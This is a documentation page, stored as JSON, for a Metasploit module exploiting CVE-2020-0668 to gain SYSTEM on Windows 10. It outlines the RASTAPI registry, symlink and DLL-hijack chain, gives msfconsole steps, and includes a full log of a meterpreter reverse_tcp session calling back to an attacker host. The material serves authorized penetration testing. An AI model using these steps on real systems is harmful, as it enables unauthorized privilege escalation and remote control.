{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/cve_2020_0668_service_tracing","result":{"data":{"moduleMetadataJson":{"id":"404201bc-360b-5261-b648-0dbdab4139ff","name":"Service Tracing Privilege Elevation Vulnerability","fullname":"exploit/windows/local/cve_2020_0668_service_tracing","description":"This module leverages a\n                                             trusted file overwrite with\n                                             a dll hijacking\n                                             vulnerability to gain\n                                             SYSTEM-level access on\n                                             vulnerable Windows 10 x64\n                                             targets","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/cve_2020_0668_service_tracing","documentationSlug":"/modules/documentation/exploit/windows/local/cve_2020_0668_service_tracing","referencesSlug":"/modules/references/exploit/windows/local/cve_2020_0668_service_tracing"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Windows 10 x64 build versions 17134-18363</p>\n<p>On builds prior to 17134, the file copy takes place, but it copies the\nlogfile rather than the payload.  it is possible that tweaking the\nMaxSize registry value will affect this, but I found not value that\nworked.</p>\n<h3 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h3>\n<p>This module makes changes to the filesystem that cannot be removed\nwithout Administrative access and a reboot happens.  Specifically, the\npayload C:\\windows\\system32\\WindowsCoreDeviceInfo.dll will be held open\nby the RasMan Service until a reboot.  That also rpevents removal of the\ndirectories (if any) that were created. I was not able to stop the\nservice without a reboot to allow file removal.</p>\n<p>This module crashes occasionally when writing to\nHKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI.  If that happens, you cannot\nre-run the module, as there will be a name collision for the symlinks\nrequired.  It might be nice to add a way to clean that up, as it\nrequires the use of the WindowsAPI through railgun.</p>\n<p>The Remote Access Service runs as system and creates a log of its\nactions called RASTAPI.LOG. Once the RASTAPI.LOG reaches a defined size,\nthe Remote Access Service copies RASTAPI.LOG to RASTAPI.OLD in the same\ndirectory.\nThe issue is twofold. First, the behavior of the Remote Access Service\nTool API is defined by three registry keys:</p>\n<ul>\n<li>HKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI\\EnableFileTracing</li>\n<li>HKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI\\FileDirectory</li>\n<li>HKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI\\new_size</li>\n</ul>\n<p>These three registry keys allow a user to turn on the RASTAPI and\nconfigure the size and location of the log file. These registry keys are\nwritable by a regular user.</p>\n<p>The second issue is that the RAST service performs only a trivial check\non the filesystem location of the RASTAPI.OLD destination. If an\nattacker creates a filesystem link between the old log destination\n(i.e. C:\\users\\user\\temp\\RASTAPI.OLD) and a trusted location\n(C:\\windows\\system32\\badfile.dll), RASDIALER will copy the old log file\nto the linked location as the SYSTEM user. In this case, we write to\nC:\\windows\\system32\\windowscoredeviceinfo.dll and then take advantage of\na hijacking vulnerability in the System Orchestrator service.</p>\n<p>The attack looks something like:</p>\n<ol>\n<li>Gain lower-privileged access to a vulnerable target.</li>\n<li>Create a dummy directory to hold files.</li>\n<li>Mount the dummy directory to \\RPC Control</li>\n<li>Upload a dll payload</li>\n<li>Create a link between \\RPC Control\\RASTAPI.LOG and the uploaded\npayload</li>\n<li>Create a link between \\RPC Control\\RASTAPI.OLD and the destination\nlocation the attacker would like to write (in this module,\nC:\\Windows\\system32\\WindowsCreDeviceInfo.dll)</li>\n<li>Write the registry keys to turn on FileTracing, set the file\ndirectory to the dummy directory, and set the max file size to one\nbyte less than the size of the payload,</li>\n<li>Upload a configuration file for the rasdialer</li>\n<li>Launch the rasdialer. When RAST service kicks off, it tries to write\na log file to the directory specified in the registry, but it finds\none already exists, and it is already full, so RAST service then\ncopies the file to the “old” location that’s linked to the trusted\nlocation. The result is an arbitrary file write to a trusted\nlocation.</li>\n<li>At this point, the overwrite is complete and we launch a trigger\nstarting the System Orchestrator service which loads the overwritten\ndll.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Get a session with basic privileges</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/local/cve_2020_0668_service_tracing</code></li>\n<li>Do: <code class=\"language-text\">set payload windows/x64/&lt;payload&gt;</code></li>\n<li>Do: <code class=\"language-text\">set SESSION &lt;sess_no&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell running as SYSTEM after several minutes.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>EXPLOIT_DIR</strong>\nDirectory to use for file upload and linking; this should not already\nexist.  The directory cannot be deleted until after a reboot.</p>\n<p>  <strong>OVERWRITE_DLL</strong>\nOverwrite WindowsCreDeviceInfo.dll if it exists (false by default).\nWindowsCoreDeviceInfo.dll is not present by default, but if it is\npresent, it is likely loaded, so even with this set to true, the\noverwrite (and exploit) will fail.</p>\n<p>  <strong>PAYLOAD<em>UPLOAD</em>NAME</strong>\nThe filename to use for the payload binary (%RAND% by default).\nThis is the name of the dll payload when uploaded to the remote host.</p>\n<p>  <strong>PHONEBOOK<em>UPLOAD</em>NAME</strong>\nThe name of the phonebook file to trigger RASDIAL (%RAND% by default).\nThe rasdialer trigger requires a config file; this is the name of the\nxml file required to trigger the RAST service.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"tested-on-windows10-x64-release-1803\" style=\"position:relative;\"><a href=\"#tested-on-windows10-x64-release-1803\" aria-label=\"tested on windows10 x64 release 1803 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested on Windows10 x64 Release 1803</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; sysinfo\nComputer        : DESKTOP-D1E425Q\nOS              : Windows 10 (10.0 Build 17134).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows\nmeterpreter &gt; getuid\nServer username: DESKTOP-D1E425Q\\msfuser\nmeterpreter &gt; getsystem\n[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:\n[-] Named Pipe Impersonation (In Memory/Admin)\n[-] Named Pipe Impersonation (Dropper/Admin)\n[-] Token Duplication (In Memory/Admin)\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nmsf5 exploit(multi/handler) &gt; use exploit/windows/local/cve_2020_0668_service_tracing \nmsf5 exploit(windows/local/cve_2020_0668_service_tracing) &gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/local/cve_2020_0668_service_tracing) &gt; set lhost 192.168.135.168\nlhost =&gt; 192.168.135.168\nmsf5 exploit(windows/local/cve_2020_0668_service_tracing) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(windows/local/cve_2020_0668_service_tracing) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(windows/local/cve_2020_0668_service_tracing) &gt; show options\n\nModule options (exploit/windows/local/cve_2020_0668_service_tracing):\n\n Name                   Current Setting  Required  Description\n ----                   ---------------  --------  -----------\n EXPLOIT_DIR                             no        The directory to create for mounting (%TEMP%\\%RAND% by default).\n OVERWRITE_DLL          false            yes       Overwrite WindowsCreDeviceInfo.dll if it exists (false by default).\n PAYLOAD_UPLOAD_NAME                     no        The filename to use for the payload binary (%RAND% by default).\n PHONEBOOK_UPLOAD_NAME                   no        The name of the phonebook file to trigger RASDIAL (%RAND% by default).\n SESSION                1                yes       The session to run this module on.\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n Name      Current Setting  Required  Description\n ----      ---------------  --------  -----------\n EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n LHOST     192.168.135.168  yes       The listen address (an interface may be specified)\n LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n Id  Name\n --  ----\n 0   Windows x64\n\n\nmsf5 exploit(windows/local/cve_2020_0668_service_tracing) &gt; run\n\n[*] Started reverse TCP handler on 192.168.135.168:4444 \n[*] Build Number = 17134\n[*] Attempting to PrivEsc on DESKTOP-D1E425Q via session ID: 1\n[*] Payload DLL is 5120 bytes long\n[*] Registry hash = [{:key_name=&gt;&quot;HKLM\\\\SOFTWARE\\\\Microsoft\\\\Tracing\\\\RASTAPI&quot;, :value_name=&gt;&quot;EnableFileTracing&quot;, :value_type=&gt;&quot;REG_DWORD&quot;, :value_value=&gt;1, :delete_on_cleanup=&gt;false}, {:key_name=&gt;&quot;HKLM\\\\SOFTWARE\\\\Microsoft\\\\Tracing\\\\RASTAPI&quot;, :value_name=&gt;&quot;FileDirectory&quot;, :value_type=&gt;&quot;REG_EXPAND_SZ&quot;, :value_value=&gt;&quot;C:\\\\Users\\\\msfuser\\\\AppData\\\\Local\\\\Temp\\\\jeYpOx&quot;, :delete_on_cleanup=&gt;false}, {:key_name=&gt;&quot;HKLM\\\\SOFTWARE\\\\Microsoft\\\\Tracing\\\\RASTAPI&quot;, :value_name=&gt;&quot;MaxFileSize&quot;, :value_type=&gt;&quot;REG_DWORD&quot;, :value_value=&gt;5119, :delete_on_cleanup=&gt;false}]\n[*] Making C:\\Users\\msfuser\\AppData\\Local\\Temp\\jeYpOx on DESKTOP-D1E425Q\n[*] Creating C:\\Users\\msfuser\\AppData\\Local\\Temp\\jeYpOx\n[*] Creating mountpoint\n[+] Successfuly opened C:\\Users\\msfuser\\AppData\\Local\\Temp\\jeYpOx\n[*] Uploading payload to C:\\Users\\msfuser\\AppData\\Local\\Temp\\FICNArio.dll\n[*] Payload md5 = b8341507939ea464f81f0245628e470f\n[*] Creating Symlinks\n[*] Creating symlink C:\\Users\\msfuser\\AppData\\Local\\Temp\\FICNArio.dll in \\RPC Control\\RASTAPI.LOG\n[*] Collected Symlink Handle 704\n[*] Creating symlink C:\\Windows\\system32\\WindowsCoreDeviceInfo.dll in \\RPC Control\\RASTAPI.OLD\n[*] Collected Symlink Handle 688\n[*] Writing EnableFileTracing to HKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI\n[*] Writing FileDirectory to HKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI\n[*] Writing MaxFileSize to HKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI\n[*] Uploading phonebook to DESKTOP-D1E425Q as C:\\Users\\msfuser\\AppData\\Local\\Temp\\TSvczqClZf.pbk from /home/tmoose/rapid7/metasploit-framework/data/exploits/cve-2020-0668/phonebook.txt\n[*] Phonebook uploaded on DESKTOP-D1E425Q to C:\\Users\\msfuser\\AppData\\Local\\Temp\\TSvczqClZf.pbk\n[*] Launching Rasdialer\n[*] Running Rasdialer with phonebook C:\\Users\\msfuser\\AppData\\Local\\Temp\\TSvczqClZf.pbk\n[*] Connecting to VPNTEST...\n\nRemote Access error 807 - The network connection between your computer and the VPN server was interrupted.  This can be caused by a problem in the VPN transmission and is commonly the result of internet latency or simply that your VPN server has reached capacity.  Please try to reconnect to the VPN server.  If this problem persists, contact the VPN administrator and analyze quality of network connectivity.\n\nFor more help on this error:\n\tType &#39;hh netcfg.chm&#39;\n\tIn help, click Troubleshooting, then Error Messages, then 807\n[*] Checking on C:\\Windows\\system32\\WindowsCoreDeviceInfo.dll\n[*] Upload payload md5 = b8341507939ea464f81f0245628e470f\n[*] Moved payload md5 = b8341507939ea464f81f0245628e470f\n[*] Cleaning up before triggering dll load...\n[*] Removing Registry keys\n[*] Deleting EnableFileTracing from HKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI key\n[*] Deleting FileDirectory from HKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI key\n[*] Deleting MaxFileSize from HKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI key\n[*] Removing Symlinks\n[*] Closing symlink handle 704: The operation completed successfully.\n[*] Closing symlink handle 688: The operation completed successfully.\n[*] Removing Mountpoint\n[*] Removing directories\n[*] Trying to start notepad\n[*] Launching notepad to host the exploit...\n[+] Process 7416 launched.\n[*] Reflectively injecting the trigger DLL into 7416...\n[*] Trigger injected.\n[*] Trigger injected. Starting thread...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[!] Manual cleanup after reboot required for C:\\Windows\\system32\\WindowsCoreDeviceInfo.dll and C:\\Users\\msfuser\\AppData\\Local\\Temp\\jeYpOx\n[*] Exploit complete.  It may take up to 10 minutes to get a session\n[*] Sending stage (206403 bytes) to 192.168.132.125\n[*] Meterpreter session 2 opened (192.168.135.168:4444 -&gt; 192.168.132.125:49680) at 2020-04-29 09:39:54 -0500\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"404201bc-360b-5261-b648-0dbdab4139ff"}}}